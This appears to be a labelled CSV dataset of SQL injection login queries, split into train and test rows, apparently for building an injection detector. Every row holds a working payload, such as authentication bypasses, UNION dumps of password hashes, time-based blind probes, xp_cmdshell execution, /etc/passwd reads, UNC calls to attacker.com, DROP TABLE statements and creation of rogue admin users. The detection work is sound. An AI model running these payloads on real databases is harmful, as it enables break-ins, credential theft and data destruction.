full_query,label,split
SELECT * FROM users WHERE user_login='1' AND (SELECT * FROM (SELECT(SLEEP(5)))a) -- ' AND pwd='password',1,test
"SELECT id, email FROM logins WHERE email='' UNION SELECT NULL,NULL,NULL -- ' AND pass_hash='pbkdf2:sha256:600000$ah5yskuN$0fc0fe08d199c3b75e841071b6ca1e5a06c5ea6294ec9230db6d6401035c1fea'",1,test
"SELECT id, user_login FROM user_accounts WHERE user_login='admin' AND LOAD_FILE('\\\\attacker.com\\share') -- ' AND pass_hash='ffd6dad155f5d75bc2813961f3892ba8'",1,test
"SELECT * FROM auth_users WHERE login='' UNION SELECT NULL,NULL,NULL,NULL; -- ' AND pass_hash='pbkdf2:sha256:600000$xrgWgItd$ec0d178f5bfe0e80ca696fce0a0ee807132fefadb79b6d7e7b62e64a97e2963f'",1,test
"SELECT id, user_login FROM user_accounts WHERE user_login='admin'/*' AND pwd='P@ssword2024!'",1,test
select * from app_users where user_login=''; EXEC xp_cmdshell('whoami'); -- ' and pw='Spring#2024',1,test
SELECT * FROM logins WHERE username='admin' ; DROP TABLE test1; -- ' AND password_hash='pbkdf2:sha256:600000$FINHG0D1$ad7893db728a49b6bc08d118bb76384588913d41bf460c17b4e40f5d04a47730',1,test
SELECT * FROM logins WHERE username='' OR 1=1 AND '1'='1' -- ' AND hashed_password='pbkdf2:sha256:600000$YncUbOIX$35332522fa8ef622e29cf0140321ac2618dec1b23df57368dcc62e5754999fc9',1,test
SELECT * FROM user_data WHERE name='john' AND hashed_password='admin'; TRUNCATE TABLE logs; -- ',1,train
select * from auth_users where email='customer1' and password='admin' OR CHAR(49)=CHAR(49) -- ',1,test
"select * from members where login='user123' and pw='admin' AND (SELECT 1 FROM (SELECT COUNT(*),CONCAT(version(),FLOOR(RAND(0)*2))x FROM information_schema.tables GROUP BY x)y) -- '",1,test
select * from user_accounts where user_login='admin' ; DROP TABLE test4; -- ' and password_hash='1e8ba402dcf69197af188d47963e6669b618aba407eaab752d2de0a591c71044',1,test
"SELECT id, user_name FROM auth_users WHERE user_name='admin' ; DROP TABLE test4; -- ' AND password='monkey'",1,test
SELECT * FROM korisnici WHERE username='' OR '1'='1' AND hashed_password='$2b$12$.SO6KqrbZS1YWTwIJ/p6EWFDNTxKowQ55FOU9z8AnlMmATwbGoZjr',1,test
"SELECT * FROM accounts WHERE user_name='' UNION SELECT NULL,NULL,NULL -- ' AND pass_hash='pbkdf2:sha256:600000$bYjh8MT5$9cc0e529f4a94ad7774dd7904509e52b418a74330194f541eabcca411ea4c37f'",1,train
"SELECT id, name FROM user_accounts WHERE name='admin' Or '1'='1' AND password='S3cur3P@ss'",1,test
select * from users where user_login='admin') --' and pass_hash='78b394791e81a5463f35ec64fbe4a84ea67d36d839d9c8eeeb189b63ddad0375',1,test
"select * from user_data where email='admin' AND ASCII(SUBSTRING(@@version,1,1))>52 -- ' and pw='it''s_a_pass'",1,test
"SELECT id, email FROM accounts WHERE email='admin'; DROP TABLE products; DROP TABLE orders; -- ' AND password='it''s_a_pass'",1,test
"SELECT id, user_login FROM users WHERE user_login='admin'; UPDATE users SET is_admin=1 WHERE username='Alex1818'; -- ' AND pass_hash='$2b$12$vAINoyMdxpDolaQ9PRNg7jjZbzLNlpA0k4UfKht0Vgs2fcQxp30oP'",1,test
SELECT * FROM auth_users WHERE user_login='matija' AND pass_hash='' OR '1'='1' #',1,test
"SELECT id, email FROM user_data WHERE email='admin'; SELECT * INTO OUTFILE '/tmp/x' FROM users; -- ' AND password='it''s_a_pass'",1,test
select * from customers where name='admin' AND LOAD_FILE('\\\\attacker.com\\share') -- ' and hashed_password='7fee6e644eb48faf827c58378a45f8f167be1971d3956d97dbc0e5072a4e1371',1,test
SELECT * FROM members WHERE user_name='admin') --' AND pass_hash='2e37a1b0bc8f181925c056424c10bbe27354c80cedf8532e1a74b40f55c9e4f1',1,train
select * from accounts where user_name='ad'||'min' OR '1'='1' and pass_hash='$2b$12$1W339Wh0ynrLgK/OAHP71V.EenleSUlnMFBWQVfugp88l.YR7OHd/',1,train
SELECT * FROM korisnici WHERE email='marko' AND hashed_password='' OR 1=1 AND '1'='1' -- ',1,test
"select * from members where user_name='' UNION SELECT 1,table_name,3 FROM information_schema.tables -- ' and pass_hash='ef4e181a02ebca9c32d5dc775db0f225'",1,test
select * from app_users where username='admin' AND 1=2 -- ' and password='S3cur3P@ss',1,test
"SELECT id, email FROM user_accounts WHERE email='test_user' AND hashed_password='admin'; UPDATE users SET is_admin=1 WHERE id=1; -- '",1,test
SELECT * FROM auth_users WHERE login='admin'; DROP TABLE products; DROP TABLE orders; -- ' AND password='root_password',1,test
SELECT * FROM app_users WHERE login='' OR 1=1 -- ' AND pwd='admin123',1,test
"SELECT id, email FROM user_data WHERE email='admin' ; DROP TABLE test1; -- ' AND pw='P@ssword2024!'",1,test
"SELECT id, login FROM auth_users WHERE login='admin' OR 0x61626364=0x61626364 -- ' AND pwd='Spring#2024'",1,test
"select * from logins where login='admin' OR IF(1=1, SLEEP(5), 0) -- ' and pw='Spring#2024'",1,test
select * from app_users where name='admin'; DROP TABLE products; DROP TABLE orders; -- ' and password='it''s_a_pass',1,test
"SELECT id, name FROM app_users WHERE name='admin' AND 1=1 -- ' AND password='admin123'",1,test
"SELECT id, user_name FROM users WHERE user_name='admin' OR 0x61626364=0x61626364 -- ' AND password='P@ssword2024!'",1,test
SELECT * FROM members WHERE user_login='admin'/*' AND pw='qwerty',1,test
SELECT * FROM customers WHERE user_name='admin' AND 1=1 -- ' AND password='S3cur3P@ss',1,test
SELECT * FROM members WHERE username='1' AND (SELECT * FROM (SELECT(SLEEP(5)))a) -- ' AND password='it''s_a_pass',1,train
select * from app_users where name='admin' AND SLEEP(5) -- ' and password_hash='$2b$12$g/H2PeETW9pFcq7/JAoWmQBepBrUjM.w/WwqFffgDvdluB4sxyOJp',1,train
"SELECT * FROM app_users WHERE username='max' AND pwd='admin' UNION SELECT id, username, password_hash, is_admin FROM users -- '",1,test
"SELECT id, name FROM accounts WHERE name='admin' UNION SELECT id, username, password_hash, is_admin FROM users -- ' AND pw='Pa$$w0rd!'",1,test
"SELECT id, user_name FROM user_accounts WHERE user_name='' UNION SELECT NULL,NULL,NULL,NULL; -- ' AND password_hash='6095dea262ae14ce11d849aa524f9cc9e5a2b797db1f227e724fcea1fb632523'",1,test
"SELECT id, login FROM app_users WHERE login='admin' AND 1=1 -- ' AND password='P@ssword2024!'",1,test
select * from customers where email='admin' /* ' and pw='test''password',1,test
"SELECT id, name FROM members WHERE name='luka' AND password='admin' AND SUBSTRING(username,1,1)='a' -- '",1,test
"SELECT * FROM user_data WHERE email='' UNION SELECT NULL,LOAD_FILE('/etc/passwd'),NULL -- ' AND hashed_password='d03ac96b096de5410288fcbace2e7e99'",1,test
"SELECT * FROM customers WHERE user_name='admin' AND EXTRACTVALUE(1,CONCAT(0x7e,VERSION())) -- ' AND pwd='MySecret123'",1,test
select * from user_accounts where user_login='admin'; ALTER TABLE users ADD COLUMN backdoor INT; -- ' and password_hash='4f66c3a4e8572a8bf12f564241e7ad88cdabc562c1f88b6a79f6fa77db88141c',1,test
select * from user_accounts where user_login='admin'/*!50000OR*/'1'='1' and password='P@ssword2024!',1,test
select * from customers where username='admin'-- -' and hashed_password='b3475f5bc21f6442ee4da0a785472f79bf75b0caa925d13d21d421022315212b',1,test
"SELECT id, username FROM korisnici WHERE username='admin' AND BENCHMARK(1000000,SHA1('a')) -- ' AND hashed_password='5e25ec6416c2023640f02cc8e5c829c414b2aa28d2c899e803e4ea62214f0391'",1,train
select * from user_accounts where email='user.name' and hashed_password='admin'/**/OR/**/'1'='1',1,test
"SELECT id, user_login FROM logins WHERE user_login='lijecnik42' AND hashed_password='admin') --'",1,test
select * from user_accounts where name='ljekarna_zg' and pwd='admin' AND 1=1 -- ',1,test
select * from app_users where username='Alex1818'; UPDATE users SET is_admin=1; -- ' and hashed_password='1744794000f27d8cf6001f9b127b1b6c',1,test
"select * from auth_users where name='' UNION SELECT username,password_hash FROM users -- ' and password='Pa$$w0rd!'",1,test
"SELECT id, user_login FROM logins WHERE user_login='' OR EXISTS(SELECT 1) -- ' AND password='secret123'",1,test
select * from korisnici where login='pacijent_001' and password='Alex1818'; UPDATE users SET is_admin=1; -- ',1,test
"select * from user_data where user_name='filip' and password='admin' AND EXTRACTVALUE(1,CONCAT(0x7e,VERSION())) -- '",1,train
"SELECT id, user_name FROM auth_users WHERE user_name='') OR ('1'='1' AND pw='S3cur3P@ss'",1,test
SELECT * FROM user_data WHERE email='admin'-- -' AND password='secret123',1,test
select * from app_users where username='john' and password='admin' OR 0x31=0x31 -- ',1,test
SELECT * FROM auth_users WHERE user_login='ivan' AND pw='admin'; DELETE FROM users; -- ',1,train
select * from accounts where name='admin' AND pg_sleep(5) -- ' and pwd='MyPharm@99',1,test
"SELECT id, email FROM accounts WHERE email='admin' AND 1=2 -- ' AND pass_hash='a1b30153272503bdfeb63fd7efb2a832'",1,test
"SELECT id, login FROM korisnici WHERE login='admin' AND UPDATEXML(1,CONCAT(0x7e,(SELECT version())),1) -- ' AND pw='Pa$$w0rd!'",1,train
SELECT * FROM logins WHERE email='admin'; TRUNCATE TABLE logs; -- ' AND password='S3cur3P@ss',1,test
"SELECT id, username FROM accounts WHERE username='' OR ''='' AND pass_hash='16f047cfbb65cbcea221cafb48a34e00360d166d7f34b0cafb8a9d631469d740'",1,test
SELECT * FROM korisnici WHERE username='admin' AND CAST((SELECT user()) AS INT) -- ' AND pwd='monkey',1,train
"SELECT id, login FROM logins WHERE login=''; CREATE USER hacker WITH SUPERUSER; -- ' AND password='monkey'",1,test
select * from user_accounts where user_name='' OR '1'='1' and pw='it''s_a_pass',1,test
select * from customers where login='' OR '1'='1' and hashed_password='pbkdf2:sha256:600000$TBPEJt2l$679aa6bff990115f527541ce3475a75443f3a2a95368d86faf26b087c9cdeb01',1,test
select * from users where user_name='' OR 'a'='a' -- ' and password_hash='6946145cba34d6d2189f733bc1845c1c5035b09354d54dea693a4c30b176b0c2',1,test
"SELECT * FROM app_users WHERE user_login='customer1' AND password_hash='admin' AND ASCII(SUBSTRING(@@version,1,1))>52 -- '",1,test
select * from accounts where login='admin' /* ' and password_hash='pbkdf2:sha256:600000$BotadOEw$78c4ea0174f65b3acddcdf2d1ce4ac788b0e0447ddade517017a5291bd128149',1,test
"SELECT id, email FROM app_users WHERE email='admin' AND 1=2 -- ' AND pwd='dragon'",1,test
"SELECT id, email FROM user_accounts WHERE email='' OR 1=1 LIMIT 1 -- ' AND pwd='nicoleivankovic'''",1,test
select * from auth_users where login='' OR 1=1 -- ' and pw='Spring#2024',1,test
"SELECT id, user_login FROM user_data WHERE user_login='admin'; DROP TABLE products; DROP TABLE orders; -- ' AND pass_hash='5a423abbbc6127b2c2f51bf9a5277fff4e8e5116081ff244faa0ad71e8f7c729'",1,test
"SELECT id, user_name FROM user_data WHERE user_name='admin' AND LOAD_FILE('\\\\attacker.com\\share') -- ' AND pass_hash='43ce7f0b870ce31d0ea9349cd0cd071e9095aa3dd1d7693965768e9873746731'",1,train
"SELECT id, email FROM korisnici WHERE email='jane.smith' AND pass_hash='admin'; SELECT * INTO OUTFILE '/tmp/x' FROM users; -- '",1,test
"select * from accounts where username='info' and pw='admin' AND SUBSTRING(username,1,1)='a' -- '",1,test
"SELECT id, login FROM user_data WHERE login='user-name' AND hashed_password='' UNION SELECT 1,table_name,3 FROM information_schema.tables -- '",1,test
"SELECT id, login FROM korisnici WHERE login='admin'; DROP TABLE users; -- ' AND pass_hash='a9de51182bce2d7ee0bbe59e2a9a3f4e63d6787e8cf1bd803659488720406bf6'",1,test
"SELECT id, user_login FROM user_data WHERE user_login='admin'; ALTER TABLE users ADD COLUMN backdoor INT; -- ' AND pass_hash='b237aedc12fed0641b2807555ca19c0a'",1,test
"SELECT id, email FROM accounts WHERE email='' OR 1=1 AND '1'='1' -- ' AND password='nicoleivankovic'''",1,test
"SELECT id, name FROM logins WHERE name='admin' AND EXTRACTVALUE(1,CONCAT(0x7e,VERSION())) -- ' AND pw='Welcome2024'",1,test
select * from users where user_name='' --' and hashed_password='pbkdf2:sha256:600000$7EW2WsSO$b61cc14e0d819408aecfe8adba2d21bb98dcf9d508ae9faa40764077747fcf6a',1,test
"SELECT id, email FROM user_data WHERE email='admin' UNION SELECT id, username, password_hash, is_admin FROM users -- ' AND pass_hash='$2b$12$YgciLl4pxYL2JH8kkpy0GD8jDqe/cH8VhTNmquxtrUbKdvDNKqtbL'",1,test
"select * from korisnici where user_name='' UNION SELECT NULL,NULL,NULL -- ' and pass_hash='pbkdf2:sha256:600000$gKcGrv4g$b18de4b44484cf056432ac7727d1d593580a60db7f5a10aa6d5410d9ebacb1f1'",1,test
SELECT * FROM user_data WHERE user_name='Alex1818'; UPDATE users SET is_admin=1; -- ' AND pwd='root_password',1,test
"SELECT id, user_name FROM accounts WHERE user_name='support' AND password_hash='1' AND (SELECT * FROM (SELECT(SLEEP(5)))a) -- '",1,test
select * from users where email='admin' AND CAST((SELECT user()) AS INT) -- ' and pass_hash='7e75c9c901efaa0f666fe4a5f34536d0',1,train
"SELECT * FROM members WHERE email='' UNION SELECT NULL,NULL,NULL,NULL; -- ' AND pw='monkey'",1,test
select * from accounts where name='admin' OR 0x31=0x31 -- ' and hashed_password='8d565535ef342b08866579de6ec48828',1,test
"SELECT id, email FROM app_users WHERE email='' UNION SELECT NULL,NULL,NULL -- ' AND password='qwerty'",1,test
SELECT * FROM users WHERE login='test_user' AND pwd='admin'--',1,train
SELECT * FROM user_data WHERE email='admin' /* ' AND pwd='MyPharm@99',1,test
select * from accounts where user_name='admin' #' and pw='MySecret123',1,train
SELECT * FROM korisnici WHERE user_name='alice' AND hashed_password='admin' ; DROP TABLE test4; -- ',1,test
select * from logins where username='Alex1818'; DROP TABLE users;-- ' and pw='letmein',1,test
select * from korisnici where login='admin' AND SLEEP(5) -- ' and password='P@ssword2024!',1,test
"SELECT id, email FROM members WHERE email='' OR 1=1 -- ' AND hashed_password='pbkdf2:sha256:600000$FW1Fb5MS$96f48a5d47b4c35c4ba5c6f71a178f933321e21219a25a08bc92517da8db0589'",1,train
select * from korisnici where email='' OR '1'='1' #' and pw='letmein',1,test
"SELECT id, user_login FROM korisnici WHERE user_login='Alex1818'; UPDATE users SET is_admin=1; -- ' AND pwd='test''password'",1,test
"SELECT id, email FROM app_users WHERE email='admin') --' AND pass_hash='pbkdf2:sha256:600000$o3rBjrQF$cde4c5df88baf34adcdaf17707d1a0b7d0a113b009bd3a22b496173737c4fde1'",1,test
select * from accounts where name='admin' AND (SELECT COUNT(*) FROM users)>0 -- ' and password_hash='$2b$12$a4oqJ6LnzENsHPeUlwwwJoIB390GiNTeqMTCpSrssaH7CFgffxXOP',1,test
select * from logins where user_login='Alex1818'; UPDATE users SET is_admin=1; -- ' and password_hash='d9f57cac809b66d7ee5412831952a66a',1,train
select * from customers where name='admin' AND (SELECT COUNT(*) FROM users)>0 -- ' and pw='password',1,test
SELECT * FROM users WHERE email='admin' OR 1=1 -- ' AND pass_hash='d7d945324a3bac6a03d296f7adade34dbd5df2d964a5a3686809a803cd15f99c',1,test
"SELECT id, user_login FROM user_data WHERE user_login='john' AND hashed_password='admin'; DROP TABLE users; -- '",1,test
SELECT * FROM users WHERE login='admin'; UPDATE users SET is_admin=1 WHERE id=1; -- ' AND password='S3cur3P@ss',1,test
SELECT * FROM accounts WHERE email='admin' AND LOAD_FILE('\\\\attacker.com\\share') -- ' AND pw='S3cur3P@ss',1,test
SELECT * FROM accounts WHERE user_login=''; CREATE USER hacker WITH SUPERUSER; -- ' AND pwd='dragon',1,test
"SELECT id, login FROM members WHERE login='admin')) --' AND pw='MyPharm@99'",1,test
"SELECT id, login FROM members WHERE login='admin' AND CAST((SELECT user()) AS INT) -- ' AND password_hash='pbkdf2:sha256:600000$ycNt6xpi$6629086f29a766a1fc672ece44646175de35fd81cbac102e3b6c1d56a8cbdfd5'",1,test
"SELECT * FROM auth_users WHERE username='' UNION SELECT 1,2,3,4 -- ' AND hashed_password='080f4250c11a888c19ede460c7585960eca0df953fc06ce863b55507799c93a0'",1,test
"SELECT id, user_name FROM customers WHERE user_name='admin' AND LOAD_FILE('\\\\attacker.com\\share') -- ' AND pass_hash='3deb22d88de88630185fe5e85c124b227beea93db310071b83c6f6dee6602e3d'",1,test
"SELECT id, user_name FROM auth_users WHERE user_name='admin' AND LENGTH(database())>5 -- ' AND password='MySecret123'",1,test
SELECT * FROM customers WHERE email='ad'||'min' OR '1'='1' AND password_hash='80083af1dcad0d3df72c86b0c7b7026e35e1814d8a02393f11f0544485cec3fd',1,test
select * from user_data where username='admin' AND 1=1 -- ' and pass_hash='5fceaf49404f1201c9cd0948ea242903',1,train
"SELECT * FROM user_accounts WHERE username='admin' AND UPDATEXML(1,CONCAT(0x7e,(SELECT version())),1) -- ' AND password='12345678'",1,test
"select * from auth_users where name='' UNION SELECT username,password_hash FROM users -- ' and hashed_password='98d0378135a96165298170c0ea7c218d9301c64b9a90a038ea54eaa6ba69a777'",1,test
SELECT * FROM members WHERE email='admin' /* ' AND pw='monkey',1,train
select * from accounts where user_name='admin'; WAITFOR DELAY '0:0:5' -- ' and pw='MySecret123',1,test
SELECT * FROM users WHERE name='' OR EXISTS(SELECT 1) -- ' AND pwd='qwerty',1,test
"SELECT * FROM user_accounts WHERE user_login='admin' AND BENCHMARK(1000000,SHA1('a')) -- ' AND hashed_password='c30028e5ac0d31437ea8c5088e1e8984d5a2a416d9dd5f90530fec9779b8e14f'",1,test
select * from users where username='admin' OR 0x61626364=0x61626364 -- ' and pwd='MyPharm@99',1,test
"SELECT id, user_login FROM users WHERE user_login='pacijent_001' AND pw='admin'/*!50000OR*/'1'='1'",1,test
SELECT * FROM auth_users WHERE name='emma' AND pwd='admin'; ALTER TABLE users ADD COLUMN backdoor INT; -- ',1,train
select * from app_users where username='admin'; DROP TABLE users; -- ' and password='Welcome2024',1,train
select * from auth_users where user_name='mike@example.com' and pass_hash='' OR 1=1 AND '1'='1' -- ',1,test
"SELECT id, user_login FROM user_data WHERE user_login='admin'; WAITFOR DELAY '0:0:5' -- ' AND hashed_password='pbkdf2:sha256:600000$CWJ2UESo$4f2b7f8f46d2ae512f6a195a8de9967b35e012ea3e2c0acc42227f5241bbd911'",1,test
SELECT * FROM logins WHERE email='admin'; DROP TABLE products; DROP TABLE orders; -- ' AND hashed_password='1de142c1f2f68bbb69c025a12d2e1f69',1,test
SELECT * FROM accounts WHERE user_login='nicoleivankovic' AND pass_hash='admin'; UPDATE users SET is_admin=1 WHERE username='Alex1818'; -- ',1,test
select * from members where email='matija' and pwd='1' AND (SELECT * FROM (SELECT(SLEEP(5)))a) -- ',1,test
SELECT * FROM app_users WHERE username='guest' AND pw='admin'; DROP TABLE users; -- ',1,test
"SELECT id, user_name FROM users WHERE user_name='user-name' AND password='admin' /* '",1,train
select * from users where email='admin'/*!50000OR*/'1'='1' and pwd='password',1,train
SELECT * FROM user_data WHERE name='admin'; UPDATE users SET is_admin=1 WHERE username='Alex1818'; -- ' AND hashed_password='a794dcd40cf14f679667cf9f946d4fd0',1,test
"SELECT id, email FROM user_data WHERE email='' OR '1'='1' AND pass_hash='$2b$12$.xl/Ab7xuZzYCvLx7pj0eJepxt8Eej6iFYSYfJ7FfjcGiB8O5G2Ar'",1,test
select * from users where user_login='admin' OR 0x31=0x31 -- ' and password='S3cur3P@ss',1,test
"select * from users where user_login='admin' AND UPDATEXML(1,CONCAT(0x7e,(SELECT version())),1) -- ' and hashed_password='$2b$12$t0ef9oT5f61YC6tnWYVaWC5q8LEl.1OmHmndwKjo9pPtx3vEctVHU'",1,test
"select * from user_data where user_login='admin'; INSERT INTO users VALUES(1,'hacker','hash',1); -- ' and password_hash='2df25eddf1973f6c606174e345e6a151'",1,test
"select * from user_data where login='admin' OR IF(1=1, SLEEP(1), 0); -- ' and pwd='P@ssword2024!'",1,test
SELECT * FROM korisnici WHERE user_name='admin'; UPDATE users SET is_admin=1 WHERE username='Alex1818'; -- ' AND pw='P@ssword2024!',1,train
"SELECT id, email FROM user_data WHERE email='marko' AND hashed_password='admin'; SELECT * INTO OUTFILE '/tmp/x' FROM users; -- '",1,test
select * from auth_users where name=''; CREATE USER hacker WITH SUPERUSER; -- ' and pw='it''s_a_pass',1,test
select * from members where name='' --' and password='Pa$$w0rd!',1,test
select * from auth_users where email='') OR ('1'='1' and password_hash='pbkdf2:sha256:600000$IBhg1ElR$07aa69b72b52ce4814f70fe74e4bc9ca08c27b9b1a3566ad98279bff80236f23',1,test
"SELECT id, username FROM app_users WHERE username='admin' OR 0x31=0x31 -- ' AND pwd='S3cur3P@ss'",1,test
"SELECT id, user_login FROM logins WHERE user_login='admin' OR 1=1/*' AND pwd='letmein'",1,test
select * from logins where name='admin' OR 0x31=0x31 -- ' and pw='admin123',1,test
SELECT * FROM user_data WHERE email='' OR EXISTS(SELECT 1) -- ' AND pass_hash='pbkdf2:sha256:600000$wtVFSn3e$013bcc09fef00bd857a61170f79dad1369a47059fe7ceb9a0988deaa33650298',1,test
SELECT * FROM korisnici WHERE name='tomislav' AND hashed_password='admin'; UPDATE users SET is_admin=1 WHERE id=1; -- ',1,train
select * from users where login='filip' and pw='admin'/*',1,test
SELECT * FROM logins WHERE username='1' AND (SELECT * FROM (SELECT(SLEEP(5)))a) -- ' AND password_hash='pbkdf2:sha256:600000$LhIddPiu$00ff2e42100dbf9c58df8f50c05daf9b23f519cbe955b09971f92820bac1e703',1,test
"SELECT * FROM members WHERE name='' UNION SELECT NULL,NULL,NULL -- ' AND pwd='Welcome123$'",1,test
select * from app_users where name='admin'/**/OR/**/'1'='1' and password_hash='329ba48c11cd8dd46cc63a6a877b94f8',1,test
"SELECT id, email FROM user_accounts WHERE email='admin' AND (SELECT 1 FROM (SELECT COUNT(*),CONCAT(version(),FLOOR(RAND(0)*2))x FROM information_schema.tables GROUP BY x)y) -- ' AND pw='test''password'",1,test
SELECT * FROM korisnici WHERE username='admin' OR CHAR(49)=CHAR(49) -- ' AND password_hash='pbkdf2:sha256:600000$r47m8g6H$88c1866905899e34d2381e9dc9bc83a56006b995941112e1aa3eff3a26359b91',1,test
select * from logins where username='' OR EXISTS(SELECT 1) -- ' and pass_hash='$2b$12$mqvD.vo3rdZnrBPtA0sYTw6fT0FSDU7.BMWsy.qRFXhZhWKeSr//5',1,test
"SELECT id, email FROM logins WHERE email='admin' UNION SELECT id, username, password_hash, is_admin FROM users -- ' AND pass_hash='$2b$12$Fd64.MRXfQhB273FntwPdRdDgjig7WovZkyXAdPJHIDRrsOZv5LMa'",1,test
select * from users where email='' OR 'x'='x' -- ' and password_hash='$2b$12$3ma1HJv0hPFI4.pzOA4tP7BA1C.X.9VVLPl36IDLJoNUF2L1ZTPWl',1,test
"SELECT id, login FROM users WHERE login='admin' UNION SELECT id, username, password_hash, is_admin FROM users -- ' AND pass_hash='e6cefbfe26eaf8f0d94d540daea29f0fcf18d763d581dfecba8f874a056989ca'",1,test
"select * from logins where name='admin' AND ASCII(SUBSTRING(@@version,1,1))>52 -- ' and hashed_password='$2b$12$M4ju2p/1k3GsnO3cp0ApVrGDsQUVGFbp7Eal42LUy8gzjeKMHMbLZ'",1,test
"SELECT id, name FROM customers WHERE name='' OR 'x'='x' -- ' AND password='MySecret123'",1,test
"select * from user_data where user_name='' UNION SELECT 1,GROUP_CONCAT(table_name),3 FROM information_schema.tables -- ' and pass_hash='b5fd2171931003a6d7bfc0c32059376e'",1,test
"SELECT id, username FROM app_users WHERE username='admin' OR '1'='1' -- ' AND pass_hash='4e1a721fc28b89da8dd7a8c1dbb9acee'",1,test
"SELECT id, username FROM users WHERE username='admin') --' AND pass_hash='pbkdf2:sha256:600000$g6mluI0L$a346703ddd55f56cd73d9be4b6c97a5c47c511a7fb8b0b9c91788c53059f028e'",1,test
SELECT * FROM accounts WHERE username='charlie' AND pw='admin' OR 1=1 -- ',1,test
SELECT * FROM user_data WHERE username='admin'; UPDATE users SET is_admin=1 WHERE id=1; -- ' AND password='MySecret123',1,test
select * from logins where user_login=''; EXEC xp_cmdshell('whoami'); -- ' and pwd='secret123',1,test
SELECT * FROM accounts WHERE user_login='admin_2024' AND hashed_password='admin'%09OR%09'1'='1',1,test
select * from auth_users where user_login='admin' AND 1=1 -- ' and password_hash='pbkdf2:sha256:600000$5WuxNFHW$594d4af648b8ced694844e4abb1b959e091175ff62e8fb8dddbae2c2f131dfa7',1,train
select * from app_users where user_name='admin' OR 1=1/*' and password_hash='f2890355420cde4c097daeb287bee19ffd9cb3359901e4e13bb7a6125bceeee4',1,test
select * from user_accounts where user_login='admin' AND LOAD_FILE('\\\\attacker.com\\share') -- ' and password='test''password',1,train
"select * from members where user_login='admin'; INSERT INTO users VALUES(1,'hacker','hash',1); -- ' and pwd='letmein'",1,train
"SELECT id, login FROM accounts WHERE login='' UNION SELECT NULL,NULL,NULL -- ' AND hashed_password='79e558545af2ad969b68b07e9ed5e434'",1,test
select * from korisnici where user_name='user123' and pass_hash='' OR 'x'='x' -- ',1,train
SELECT * FROM auth_users WHERE email='1' AND (SELECT * FROM (SELECT(SLEEP(5)))a) -- ' AND pwd='it''s_a_pass',1,test
SELECT * FROM user_data WHERE username='admin' #' AND pw='S3cur3P@ss',1,test
"SELECT * FROM accounts WHERE login='' UNION SELECT 1,2,3,4 -- ' AND password_hash='734cb5d9e5b0b0a7dff2141c930fc5a612b13584206604371c1207ddb9e38145'",1,test
select * from user_data where name='admin'/*!50000OR*/'1'='1' and password='root_password',1,test
SELECT * FROM customers WHERE user_name='admin'; DROP TABLE products; DROP TABLE orders; -- ' AND pass_hash='pbkdf2:sha256:600000$6AQz6sBY$ee51cf8e06130b952447d3a0c2905f2b40af634224f1adcc6d9b211c1688757b',1,test
SELECT * FROM customers WHERE user_name='' OR '1'='1'-- ' AND pwd='P@ssword2024!',1,test
SELECT * FROM accounts WHERE email='admin')) --' AND pass_hash='$2b$12$bFzPl1G.LhrcJBXAUjfU.bB0Tf5OTbBYOz/UumN1QP6P0Dp7SjvUv',1,test
"SELECT id, user_name FROM user_accounts WHERE user_name='admin'; DROP TABLE users; -- ' AND pwd='letmein'",1,test
SELECT * FROM app_users WHERE login='admin' AND 1=2 -- ' AND pw='monkey',1,test
"SELECT * FROM users WHERE username='admin' AND IF(1=1,SLEEP(5),0) -- ' AND pass_hash='16173a61034fb1e96506489c84bf0660'",1,test
select * from users where user_name='admin' OR 0x61626364=0x61626364 -- ' and pw='password',1,test
"SELECT id, user_name FROM user_data WHERE user_name='admin' OR 1=1/*' AND pass_hash='7ea37adb297da958ad5d92389320095e'",1,test
"SELECT id, user_name FROM customers WHERE user_name='' OR '1'='1' AND password_hash='2c40e17b37738ded87cd0da9706da65e'",1,test
"SELECT id, name FROM auth_users WHERE name='admin' AND ASCII(SUBSTRING(@@version,1,1))>52 -- ' AND pwd='Welcome123$'",1,train
"SELECT id, username FROM korisnici WHERE username='admin' AND (SELECT 1 FROM (SELECT COUNT(*),CONCAT(version(),FLOOR(RAND(0)*2))x FROM information_schema.tables GROUP BY x)y) -- ' AND pass_hash='pbkdf2:sha256:600000$erIWFzBq$2b1915c65ada50cc138fc1d2325b7324b13cc7c7dfccc994aebbc4c146ee4d4c'",1,test
"SELECT id, login FROM logins WHERE login='admin' AND CAST((SELECT user()) AS INT) -- ' AND pwd='MyPharm@99'",1,train
SELECT * FROM user_data WHERE user_name='admin' OR CHAR(49)=CHAR(49) -- ' AND pwd='monkey',1,test
select * from auth_users where name='admin'; DELETE FROM users; -- ' and pw='secret123',1,test
select * from user_accounts where name='grace' and pwd='admin'; DROP TABLE products; DROP TABLE orders; -- ',1,test
